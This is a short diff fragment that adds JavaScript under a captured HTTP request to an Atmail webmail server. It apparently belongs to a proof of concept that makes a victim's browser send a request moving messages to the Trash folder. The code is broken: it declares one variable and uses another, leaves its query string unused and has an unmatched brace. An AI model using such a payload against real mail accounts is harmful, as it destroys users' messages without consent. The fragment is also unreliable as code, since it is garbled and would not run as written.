@@ -10,3 +10,15 @@ Connection: close
 Referer: http://atmail/index.php/mail
 Cookie: atmail6=e5j8phkmg6uemhlj3m0dnn9s66
 
+        console.log(kill)
+
+        var uri = "http://atmail/index.php/mail/mail/movetofolder/fromFolder/INBOX/toFolder/INBOX.Trash";
+        var xhr = new XMLHttpRequest()
+        var query_string = "?resultContext=messageList&mailId%5B%5D=" + kill; 
+        xhr.open('GET', url, true);
+
+}
+xhr.send(null);
+
+
+
